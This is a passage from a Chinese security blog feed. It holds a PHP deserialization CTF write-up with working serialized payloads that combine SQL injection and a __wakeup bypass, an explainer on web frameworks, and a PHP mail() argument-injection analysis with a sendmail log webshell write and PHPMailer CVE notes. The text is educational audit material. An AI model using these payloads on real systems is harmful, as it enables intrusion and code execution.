class="keyword">die</span>( <span class="title function_ invoke__">json_encode</span>( <span class="keyword">array</span>(<span class="string">&quot;msg&quot;</span>=&gt; <span class="variable">$msg</span>) ) );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__close</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">mysql_close</span>(<span class="variable">$this</span>-&gt;conn);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">source</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">__conn</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$this</span>-&gt;method, <span class="keyword">array</span>(<span class="string">&quot;login&quot;</span>, <span class="string">&quot;source&quot;</span>))) &#123;</span><br><span class="line">            @<span class="title function_ invoke__">call_user_func_array</span>(<span class="keyword">array</span>(<span class="variable">$this</span>, <span class="variable">$this</span>-&gt;method), <span class="variable language_">$this</span>-&gt;args);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">__die</span>(<span class="string">&quot;What do you do?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">__close</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable language_">$this</span>-&gt;args <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;args[<span class="variable">$k</span>] = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">mysql_escape_string</span>(<span class="variable">$v</span>)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SoFun</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;file)) &#123;</span><br><span class="line">            <span class="keyword">include</span> <span class="variable language_">$this</span>-&gt;file;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt; file=<span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>])) &#123;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title function_ invoke__">HITCON</span>(<span class="string">&quot;source&quot;</span>, <span class="keyword">array</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//config.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$db_host</span> = <span class="string">&#x27;localhost&#x27;</span>;</span><br><span class="line">    <span class="variable">$db_name</span> = <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line">    <span class="variable">$db_user</span> = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">    <span class="variable">$db_pass</span> = <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line"><span class="variable">$DEBUG</span> = <span class="string">&#x27;xx&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// flag.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;IN_FLAG&#x27;</span>) &amp;&amp; <span class="keyword">exit</span>(<span class="string">&#x27;Access Denied&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag&#123;un3eri@liz3_i3_s0_fun&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问flag.php,显示禁止访问，题目默认显示源码，在下图代码57行，数据库查询内容不为空的情况下，定义常量IN_FLAG，猜测需要满足该条件才能访问flag.php。然后调用loadData函数。loadData函数，对传入参数进行判断，如果验证通过，则作为参数传入到反序列化函数，验证不通过返回为空，该判断绕过可参考Day11,传入内容来源于数据库查询结果，此时可考虑如何构造数据库查询结果。</p><p>在index.php页面显示源码中，我们发现SoFun类,如下图，在**__destruct()<strong>函数中，会对类变量$this-&gt;file所对应的文件进行包含，类变量反序列化可控，在loadData函数调用前，对IN_FLAG常量进行了设置，如果loadData函数传入参数值为SoFun类反序列化字符串，且控制类变量<code>$this-&gt;file=flag.php</code>，则可以包含flag.php文件，此时<code>&#39;IN_FLAG&#39;</code>已经设置，可获取到flag，需考虑绕过__wakeup</strong>函数。</p><p>考虑如何控制loadData函数传入参数的值，从下图可知，$obj-&gt;role来源于数据库查询结果，而构建sql语句的username字段来源于**$username**,$username变量来源于func_get_args()函数,该函数返回包含调用函数参数列表的数组,如果login()函数传入参数可控，可通过union联合查询，构造查询结果，使构造数据为SoFun类序列化字符串。我们去看一下login函数的调用。<br><img src="/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-21.png"></p><p>在HINCON类**__destruct方法中，通过call_user_func_array()函数调用login或source方法，如果$this-&gt;method&#x3D;’login’则可以调用login()函数，$this-&gt;method为类变量，反序列化可控。$this-&gt;args<strong>为调用函数传入参数，意味着login函数中$username变量可控，此时可通过SQL注入，构造查询数据。在进行反序列化时，会调用</strong>__wakeup对类变量args进行处理，此时调用mysql_escape_string函数对$this-&gt;args进行转义。可通过CVE-2016-7124<strong>，序列化字符串中，如果表示对象属性个数的值大于真实的属性个数时就会跳过</strong>__wakeup**的执行。绕过检测，进行sql注入。<br>总结一下思路：</p><ol><li><p>构造HITCON类反序列化字符串，其中**$method&#x3D;’login’,$args**数组’username’部分可用于构造SQL语句，进行SQL注入，’password’部分任意设置。</p></li><li><p>调用login()函数后，利用$username构造联合查询，使查询结果为SoFun类反序列化字符串，设置**$file&#x3D;’flag.php’，需绕过__wakeup()**函数。</p></li><li><p>绕过**LoadData()**函数对反序列化字符串的验证,参考Day11。</p></li><li><p>SoFun类 __destruct()函数调用后,包含flag.php文件，获取flag，需绕过__wakeup()函数。<br>第二个答案是另一种思路，大家可研究一下。<br>注：因为传参方式为GET，注意进行URL编码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">O:6:&quot;HITCON&quot;:3:&#123;s:6:&quot;method&quot;;s:5:&quot;login&quot;;s:4:&quot;args&quot;;a:2:&#123;s:8:&quot;username&quot;;s:81:&quot;1&#x27; union select 1,2,&#x27;a:1:&#123;s:2:&quot;xx&quot;;O:%2b5:&quot;SoFun&quot;:2:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;&#x27;%23&quot;;s:8:&quot;password&quot;;s:3:&quot;234&quot;;&#125;&#125;</span><br><span class="line">O:5:&quot;SoFun&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br><span class="line">a:1:&#123;s:2:&quot;xx&quot;;O:5:&quot;SoFun&quot;:2:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:5:&quot;SoFun&quot;:3:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;s:2:&quot;ff&quot;;O:6:&quot;HITCON&quot;:5:&#123;s:6:&quot;method&quot;;s:5:&quot;login&quot;;s:4:&quot;args&quot;;a:2:&#123;i:0;s:12:&quot;1&#x27; or &#x27;1&#x27;--+&quot;;i:1;s:3:&quot;111&quot;;&#125;s:4:&quot;conn&quot;;N;&#125;&#125;</span><br></pre></td></tr></table></figure><p>上述第二个答案的思路：</p></li><li><p><strong>构造对象和方法调用</strong>:</p><ul><li>利用 <code>HITCON</code> 类的 <code>__destruct()</code> 方法在对象被销毁时自动调用。这个方法会检查 <code>method</code> 属性中指定的方法是否属于允许的方法列表（<code>login</code> 或 <code>source</code>），然后动态调用这些方法。</li><li>序列化的 <code>HITCON</code> 对象中设置 <code>method</code> 属性为 <code>login</code>，并且通过 <code>args</code> 属性传入用户名和密码，其中用户名部分被设计为 SQL 注入代码。</li></ul></li><li><p><strong>SQL 注入</strong>:</p><ul><li>在 <code>login()</code> 方法中，构造的 SQL 查询受到 <code>username</code> 字段的影响，这里使用的 <code>sprintf()</code> 函数对 <code>username</code> 和 <code>password</code> 进行格式化并嵌入到 SQL 语句中，允许注入恶意 SQL 代码。</li><li>示例中的用户名 <code>&quot;1&#39; union select 1,2,&#39;a:1:&#123;s:2:&quot;xx&quot;;O:5:&quot;SoFun&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;&#39;--&quot;</code> 通过 SQL 注入改变了查询结果，让查询返回一个新的 <code>SoFun</code> 类的序列化字符串。</li></ul></li><li><p><strong>反序列化和文件包含</strong>:</p><ul><li><code>SoFun</code> 类在其 <code>__destruct()</code> 方法中包含一个指定的文件，通过修改 <code>file</code> 属性指向 <code>flag.php</code>，可以在脚本执行末尾包含并执行该文件。</li><li>反序列化字符串中，<code>SoFun</code> 对象设置 <code>file</code> 属性为 <code>&quot;flag.php&quot;</code>，在 <code>__destruct()</code> 被调用时包含这个文件，导致执行 <code>flag.php</code> 中的代码并输出 flag。</li></ul></li><li><p><strong>绕过__wakeup()安全措施</strong>:</p><ul><li>在 <code>SoFun</code> 类中，<code>__wakeup()</code> 方法将 <code>file</code> 属性重置为 <code>&quot;index.php&quot;</code>，为了绕过这个重置，注入的 SQL 必须在 <code>SoFun</code> 对象被反序列化之后执行，以确保 <code>file</code> 的值在执行 <code>__destruct()</code> 时是 <code>&quot;flag.php&quot;</code>。</li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> Code Audit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Web安全】Web应用框架</title>
      <link href="/2024/10/11/WebSecurity/framwork/webarchitecture/"/>
      <url>/2024/10/11/WebSecurity/framwork/webarchitecture/</url>
      
        <content type="html"><![CDATA[<h2 id="Web应用框架"><a href="#Web应用框架" class="headerlink" title="Web应用框架"></a>Web应用框架</h2><p>百度百科是这么解释的：<br>Web应用框架（Web application framework）是一种开发框架，用来支持动态网站、网络应用程序及网络服务的开发。其类型有基于请求的和基于组件的两种框架。<br>web框架可以分为基于请求的（request-based）和基于组件的（component-based）两大阵营。前者的代表有Struts和Spring MVC等，后者的成员则有JSF、Tapestry等等。</p><ol><li>基于请求的框架较早出现，它用以描述一个web应用程序结构的概念和传统的静态Internet站点一样，是将其机制扩展到动态内容的延伸。对一个提供HTML和图片等静态内容的网站，网络另一端的浏览器发出以URI形式指定的资源的请求，Web服务器解读请求，检查该资源是否存在于本地，如果是则返回该静态内容，否则通知浏览器没有找到。Web应用升级到动态内容领域后，这个模型只需要做一点修改。那就是web服务器收到一个URL请求（相较于静态情况下的资源，动态情况下更接近于对一种服务的请求和调用）后，判断该请求的类型，如果是静态资源，则照上面所述处理；如果是动态内容，则通过某种机制（CGI、调用常驻内存的模块、递送给另一个进程如Java容器）运行该动态内容对应的程序，最后由程序给出响应，返回浏览器。在这样一个直接与web底层机制交流的模型中，服务器端程序要收集客户端籍get或post方式提交的数据，转换，校验，然后以这些数据作为输入运行业务逻辑后生成动态的内容（包括HTML、JavaScript、CSS、图片等）。</li><li>基于组件的框架采取了另一种思路，它把长久以来软件开发应用的组件思想引入到web开发。服务器返回的原本文档形式的网页被视为由一个个可独立工作、重复使用的组件构成。每个组件都能接受用户的输入，负责自己的显示。上面提到的服务器端程序所做的数据收集、转换、校验的工作都被下放给各个组件。现代web框架基本上都采用了模型、视图、控制器相分离的MVC架构，基于请求和基于组件两种类型大都会有一个控制器将用户的请求分派给负责业务逻辑的模型，运算的结果再以某个视图表现出来，所以两大分类框架的区别主要在视图部分，基于请求的框架仍然把视图也就是网页看作是一个文档整体，程序员要用HTML、Javascript和CSS这些底层的代码来写“文档”，而基于组件的框架则把视图看作由积木一样的构件拼成，积木的显示不用程序员操心（当然它们也是由另一些程序员开发出来的），只要设置好它绑定的数据和调整它的属性，把他们大大从编写HTML、Javascript和CSS这些界面的工作中解放出来。</li></ol><p>上面是百度百科的回答，下面我又找到了知乎一篇文章的描述：</p><ol><li>基于“组件”（Component ，GUI设计也常称控件）、事件驱动的架构，最常见的是微软的.NET。基本思想是把程序分成很多组件，每个组件都可以触发事件，调用特定的事件处理器来处理（比如在一个HTML按钮上设置onClick事件链接到一个PHP函数）。这种设计远离HTTP，HTTP请求完全抽象，映射到一个事件。事实上这种设计原本最常应用于传统桌面GUI程序的开发，例如Delphi，Java Swing等。所有表现层的组件比如窗口，或者HTML表单都可以由IDE来提供，我们只需要在IDE里点击或拖动鼠标就能够自动添加一个组件，并且添加一个相应的事件处理器。</li><li>基于“WEB页面&#x2F;文件”，例如CGI和PHP&#x2F;ASP程序。程序的文件分别存储在不同的目录里，与URL相对应。当HTTP请求提交至服务器时，URL直接指向某个文件，然后由该文件来处理请求，并返回响应结果。比如<a href="http://www.website.conm/news/readnews.php?id=1234%E5%8F%AF%E4%BB%A5%E6%83%B3%E5%83%8F%EF%BC%8C%E6%88%91%E4%BB%AC%E5%9C%A8%E7%AB%99%E7%82%B9%E6%A0%B9%E7%9B%AE%E5%BD%95%E7%9A%84news%E7%9B%AE%E5%BD%95%E4%B8%8B%E6%94%BE%E7%BD%AE%E4%B8%80%E4%B8%AAreadnews.php%E6%96%87%E4%BB%B6%E3%80%82%E8%BF%99%E7%A7%8D%E5%BC%80%E5%8F%91%E6%96%B9%E5%BC%8F%E6%9C%80%E8%87%AA%E7%84%B6%EF%BC%8C%E6%9C%80%E6%98%93%E7%90%86%E8%A7%A3%EF%BC%8C%E4%B9%9F%E6%98%AFPHP%E6%9C%80%E5%B8%B8%E7%94%A8%E7%9A%84%E6%96%B9%E5%BC%8F%E3%80%82%E8%A6%81%E6%B3%A8%E6%84%8F%E4%BA%A7%E7%94%9F%E7%9A%84URL%E5%AF%B9%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E4%B8%8D%E5%8F%8B%E5%A5%BD%EF%BC%8C%E4%B8%8D%E8%BF%87%E4%BD%A0%E5%8F%AF%E4%BB%A5%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%8F%90%E4%BE%9B%E7%9A%84URL%E9%87%8D%E5%86%99%E6%96%B9%E6%A1%88%E6%9D%A5%E5%A4%84%E7%90%86%EF%BC%8C%E4%BE%8B%E5%A6%82Apache%E7%9A%84mod_rewrite%E3%80%82">http://www.website.conm/news/readnews.php?id=1234可以想像，我们在站点根目录的news目录下放置一个readnews.php文件。这种开发方式最自然，最易理解，也是PHP最常用的方式。要注意产生的URL对搜索引擎不友好，不过你可以用服务器提供的URL重写方案来处理，例如Apache的mod_rewrite。</a></li><li>基于“动作”(Action)。这是MVC架构的WEB程序所采用的最常见的方式。目前主流的WEB框架像Struts、Webwork(Java)，Ruby on Rails(Ruby),Zend Framework(PHP)等都采用这种设计。URL映射到控制器(controller)和控制器中的动作(action)，由action来处理请求并输出响应结果。这种设计和上面的基于文件的方式一样，都是请求&#x2F;响应驱动的方案，离不开HTTP。比如 <a href="http://www.website.com/news/read/id/1234">http://www.website.com/news/read/id/1234</a> 可以想像在实际代码中，我们会有一个控制器newsController，其中有一个readAction。不同框架可能默认实现方式稍有不同，有的是一个Controller一个文件，其中有多个Action，有的是每个Action一个文件。这种方式的URL通常都很漂亮，对搜索引擎友好，因为很多框架都自带有URL重写功能。可以自由规定URL中controller、action及参数出现的位置。</li></ol><p>另外，还有更直接的基于URL的设计方案，那就是REST。通过人为规定URL的构成形式（比如Action限制成只有几种）来促进网站之间的互相访问，降低开发的复杂性，提高系统的可伸缩性。REST对于Web Services来说是一个创新。虽然本文讨论的是单个项目所采用的架构，而REST是为了解决网站之间的通讯问题，但REST的出现，会对单个项目的架构造成影响（很显然你在开发时就要构造规范的URL）。将来混用REST和MVC应该也是一种趋势。RoR提供很好的REST支持，Zend Framework也提供了Zend_Rest来支持REST，包括Server和Client。</p><p>除了上面之外，我还总结有以下内容：<br>4. 微服务架构 (Microservices Architecture) 微服务架构是一种设计方法，其中应用程序被构建为一组小的服务，每个服务执行单一功能，运行在其自己的进程中，并通过轻量级通信机制（通常是HTTP资源API）进行通信。每个服务都围绕业务能力构建，并独立于其他服务进行部署。（Docker、Kubernetes、API Gateway）<br>5. 无服务器架构 (Serverless Architecture) 无服务器架构允许开发者编写和部署代码而不需要关注底层服务器。运行时，代码在状态为无的容器中执行，这些容器由云提供商动态管理。开发者只需关注代码和应用逻辑，而无需管理服务器或运行时环境。（AWS Lambda、Azure Functions、Google Cloud Functions）</p><p>参考文章：<a href="https://cloud.tencent.com/developer/article/2406698">深度解析四大主流软件架构模型：单体架构、分布式应用、微服务与Serverless的优缺点及场景应用</a></p><h2 id="涉及模式"><a href="#涉及模式" class="headerlink" title="涉及模式"></a>涉及模式</h2><p><a href="https://liaoxuefeng.com/books/java/design-patterns/creational/index.html">廖学锋的网站讲的设计模式</a><br><a href="https://www.runoob.com/design-pattern/visitor-pattern.html">菜鸟教程设计模式</a><br><a href="https://segmentfault.com/a/1190000030850326">图解九种设计模式</a></p>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【代码审计】PHP代码审计2</title>
      <link href="/2024/10/10/WebSecurity/codeaudit/phpaudit2/"/>
      <url>/2024/10/10/WebSecurity/codeaudit/phpaudit2/</url>
      
        <content type="html"><![CDATA[<h2 id="postcard"><a href="#postcard" class="headerlink" title="postcard"></a>postcard</h2><p>题目叫做明信片，代码如下：<br><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image.png"><br><strong>漏洞解析</strong> ：</p><p>这道题其实是考察由 <strong>php</strong> 内置函数 <strong>mail</strong> 所引发的命令执行漏洞。我们先看看 <strong>php</strong> 自带的 <strong>mail</strong> 函数的用法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">bool</span> <span class="title function_ invoke__">mail</span> (</span><br><span class="line"><span class="keyword">string</span> <span class="variable">$to</span> ,</span><br><span class="line"><span class="keyword">string</span> <span class="variable">$subject</span> ,</span><br><span class="line"><span class="keyword">string</span> <span class="variable">$message</span> [,</span><br><span class="line"><span class="keyword">string</span> <span class="variable">$additional_headers</span> [,</span><br><span class="line"><span class="keyword">string</span> <span class="variable">$additional_parameters</span> ]]</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>其参数含义分别表示如下：</p><blockquote><ul><li>to，指定邮件接收者，即接收人</li><li>subject，邮件的标题</li><li>message，邮件的正文内容</li><li>additional_headers，指定邮件发送时其他的额外头部，如发送者From，抄送CC，隐藏抄送BCC</li><li>additional_parameters，指定传递给发送程序sendmail的额外参数。</li></ul></blockquote><p>在Linux系统上， <strong>php</strong> 的 <strong>mail</strong> 函数在底层中已经写好了，默认调用 <strong>Linux</strong> 的 <strong><a href="http://www.sendmail.com/">sendmail</a></strong> 程序发送邮件。而在额外参数( <strong>additional_parameters</strong> )中， <strong>sendmail</strong> 主要支持的选项有以下三种：</p><blockquote><ul><li><p>-O option &#x3D; value</p><p>QueueDirectory &#x3D; queuedir 选择队列消息</p></li><li><p>-X logfile</p><p>这个参数可以指定一个目录来记录发送邮件时的详细日志情况。</p></li><li><p>-f from email</p><p>这个参数可以让我们指定我们发送邮件的邮箱地址。</p></li></ul></blockquote><p>举个简单例子方便理解: </p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-1.png"></p><p>上面这个样例中，我们使用 <strong>-X</strong> 参数指定日志文件，最终会在 <strong>&#x2F;var&#x2F;www&#x2F;html&#x2F;rce.php</strong> 中写入如下数据：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">17220</span> &lt;&lt;&lt; To: Alice@example.com</span><br><span class="line"> <span class="number">17220</span> &lt;&lt;&lt; Subject: Hello Alice!</span><br><span class="line"> <span class="number">17220</span> &lt;&lt;&lt; X-PHP-Originating-Script: <span class="number">0</span>:test.php</span><br><span class="line"> <span class="number">17220</span> &lt;&lt;&lt; CC: somebodyelse@example.com</span><br><span class="line"> <span class="number">17220</span> &lt;&lt;&lt;</span><br><span class="line"> <span class="number">17220</span> &lt;&lt;&lt; <span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>(); <span class="meta">?&gt;</span></span><br><span class="line"> <span class="number">17220</span> &lt;&lt;&lt; [EOF]</span><br></pre></td></tr></table></figure><p>当然这题如果只是这一个问题的话，会显的太简单了，我们继续往下看，在 <strong>第3行</strong> 有这样一串代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">filter_var</span>(<span class="variable">$email</span>, FILTER_VALIDATE_EMAIL)</span><br></pre></td></tr></table></figure><p>这串代码的主要作用，是确保在第5个参数中只使用有效的电子邮件地址 <strong>$email</strong> 。我们先了解一下 <strong>filter_var()</strong> 函数的定义：</p><blockquote><p><strong><a href="http://php.net/manual/zh/function.filter-var.php">filter_var</a></strong> ：使用特定的过滤器过滤一个变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed filter_var ( mixed $variable [, int $filter = FILTER_DEFAULT [, mixed $options ]] )</span><br></pre></td></tr></table></figure><p><strong>功能</strong> ：这里主要是根据第二个参数filter过滤一些想要过滤的东西。</p></blockquote><p>关于 <strong>filter_var()</strong> 中 <strong>FILTER_VALIDATE_EMAIL</strong> 这个选项作用，我们可以看看这个帖子 <a href="https://stackoverflow.com/questions/19220158/php-filter-validate-email-does-not-work-correctly">PHP FILTER_VALIDATE_EMAIL</a> 。这里面有个结论引起了我的注意： <strong>none of the special characters in this local part are allowed outside quotation marks</strong> ，表示所有的特殊符号必须放在双引号中。 <strong>filter_var()</strong> 问题在于，我们在双引号中嵌套转义空格仍然能够通过检测。同时由于底层正则表达式的原因，我们通过重叠单引号和双引号，欺骗 <strong>filter_val()</strong> 使其认为我们仍然在双引号中，这样我们就可以绕过检测。下面举个简单的例子，方便理解：</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-2.png"></p><p>当然由于引入的特殊符号，虽然绕过了 <strong>filter_var()</strong> 针对邮箱的检测，但是由于PHP的 <strong>mail()</strong> 函数在底层实现中，调用了 <strong>escapeshellcmd()</strong> 函数，对用户输入的邮箱地址进行检测，导致即使存在特殊符号，也会被 <strong>escapeshellcmd()</strong> 函数处理转义，这样就没办法达到命令执行的目的了。 <strong>escapeshellcmd()</strong> 函数在底层代码如下（详细点 <a href="https://github.com/php/php-src/blob/PHP-5.6.29/ext/standard/mail.c">这里</a> ）：<br><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-3.png"><br>因此我们继续往下看，在第七行有这样一串代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$email</span>);</span><br></pre></td></tr></table></figure><p>这句代码主要是处理 <strong>$email</strong> 传入的数据。我们先来看一下 <strong>escapeshellarg</strong> 函数的定义：</p><blockquote><p><strong><a href="http://php.net/manual/zh/function.escapeshellarg.php">escapeshellarg</a></strong> — 把字符串转码为可以在 shell 命令里使用的参数</p><p><strong>功能</strong> ：escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，shell 函数包含 exec()，system() 执行运算符(反引号)</p><p><strong>定义</strong> ：<code>string escapeshellarg ( string $arg )</code></p></blockquote><p>具体功能作用，可以参考如下案例：<br><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-4.png"><br>那我们前面说过了PHP的 <strong>mail()</strong> 函数在底层调用了 <strong>escapeshellcmd()</strong> 函数对用户输入的邮箱地址进行处理，即使我们使用带有特殊字符的payload，绕过 <strong>filter_var()</strong> 的检测，但还是会被 <strong>escapeshellcmd()</strong> 处理。然而 <strong>escapeshellcmd()</strong> 和 <strong>escapeshellarg</strong> 一起使用，会造成特殊字符逃逸，下面我们给个简单例子理解一下：</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-5.png"></p><p>详细分析一下这个过程：</p><ol><li><p>传入的参数是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&#x27; -v -d a=1</span><br></pre></td></tr></table></figure></li><li><p>由于<code>escapeshellarg</code>先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。所以处理之后的效果如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;127.0.0.1&#x27;\&#x27;&#x27; -v -d a=1&#x27;</span><br></pre></td></tr></table></figure></li><li><p>接着 <code>escapeshellcmd</code> 函数对第二步处理后字符串中的 <code>\</code> 以及 <code>a=1&#39;</code> 中的单引号进行转义处理，结果如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;127.0.0.1&#x27;\\&#x27;&#x27; -v -d a=1\&#x27;</span><br></pre></td></tr></table></figure></li><li><p>由于第三步处理之后的payload中的 <code>\\</code> 被解释成了 <code>\</code> 而不再是转义字符，所以单引号配对连接之后将payload分割为三个部分，具体如下所示：</p></li></ol><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-6.png"></p><p>所以这个payload可以简化为 <code>curl 127.0.0.1\ -v -d a=1&#39;</code> ，即向 <code>127.0.0.1\</code> 发起请求，POST 数据为 <code>a=1&#39;</code> 。</p><p>总结一下，这题实际上是考察绕过 <strong>filter_var()</strong> 函数的邮件名检测，通过 <strong>mail</strong> 函数底层实现中调用的 <strong>escapeshellcmd()</strong> 函数处理字符串，再结合 <strong>escapeshellarg()</strong> 函数，最终实现参数逃逸，导致 <strong>远程代码执行</strong> 。</p><h3 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h3><p>这里实例分析选择 <strong>PHPMailer 命令执行漏洞</strong> （  <strong>CVE-2016-10045</strong> 和 <strong>CVE-2016-10033</strong> ）。项目代码可以通过以下方式下载：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/PHPMailer/PHPMailer</span><br><span class="line"><span class="built_in">cd</span> PHPMailer</span><br><span class="line">git checkout -b CVE-2016-10033 v5.2.17</span><br></pre></td></tr></table></figure><h4 id="CVE-2016-10045"><a href="#CVE-2016-10045" class="headerlink" title="CVE-2016-10045"></a>CVE-2016-10045</h4><p>漏洞原理</p><p>在github上直接diff一下，对比一下不同版本的 <strong><a href="https://github.com/PHPMailer/PHPMailer/compare/v5.2.17...v5.2.18#diff-ace81e501931d8763b49f2410cf3094d">class.phpmailer.php</a></strong> 文件，差异如下：</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-7.png"></p><p>这里在 